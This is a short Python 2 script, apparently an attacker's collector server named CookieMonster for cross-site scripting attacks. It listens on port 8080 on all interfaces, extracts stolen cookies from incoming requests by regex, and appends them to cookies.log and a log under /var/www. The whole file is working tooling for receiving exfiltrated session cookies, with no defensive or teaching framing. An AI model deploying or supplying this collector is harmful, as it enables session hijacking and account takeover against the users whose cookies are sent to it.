#!/usr/bin/python

import re
import os
import sys
import threading
import SocketServer

address='0.0.0.0'
port = 8080

# Used to find the cookies in the messages
cookie_re_raw='cookie=(.+?) HTTP/1.[0|1]'
cookie2_re_raw='Cookie: (.+)'
cookie_re = re.compile(cookie_re_raw)
cookie2_re = re.compile(cookie2_re_raw)

# If we collect a cookie it will go here
cookie_jar = "cookies.log"
collector_log="/var/www/collector_log.txt"

log = None
log_length = 0

# Class that acts as a simple server to recieve messages and check for cookies
class CookieMonster(SocketServer.BaseRequestHandler):
  def __init__(self, request, client_address, server):
    SocketServer.BaseRequestHandler.__init__(self, request, client_address, server)
    return

  def setup(self):
    return SocketServer.BaseRequestHandler.setup(self)

  def handle(self):
    data = self.request.recv(2048)
    print("Received data:\n{}".format(data))
    sendToLog("\n=============\nReceived data:\n{}\n".format(data))

    m = cookie_re.search(data)
    if m is None:
      m = cookie2_re.search(data)

    cookie = "no cookie"
    if m is None:
      print("No cookie provided in request")
      sendToLog("No cookie found in request\n")
      self.request.send("no cookies :(\n")
    else:
      with open(cookie_jar, "a") as f:
        cookie = m.group(1)
        print("Cookie found in request!")
        sendToLog("Cookie found in request!\n")
        print("cookie: {}".format(cookie))
        sendToLog("cookie: {}\n".format(cookie))
        f.write("{}\n".format(cookie))

    self.request.send(cookie + "\n")
    return

  def finish(self):
    return SocketServer.BaseRequestHandler.finish(self)


def sendToLog(txt):
  global log_length

  if log is None:
    return

  if log_length == 10:
    log.truncate()
    log_length = 0

  log.write(txt)
  log.flush()
  os.fsync(log)

  log_length += 1

if __name__ == '__main__':
  if len(sys.argv) > 1:
    port = int(sys.argv[1])

  try:
    log = open(collector_log, "w+")
  except Exception as e:
    print("Failed to open the collector log")

  print("Starting collector on (addr={}, port={})".format(address, port))
  sendToLog("Starting collector on (addr={}, port={})\n".format(address,port))

  # Listen on the external interface
  server = SocketServer.TCPServer((address, port), CookieMonster)
  server.serve_forever()
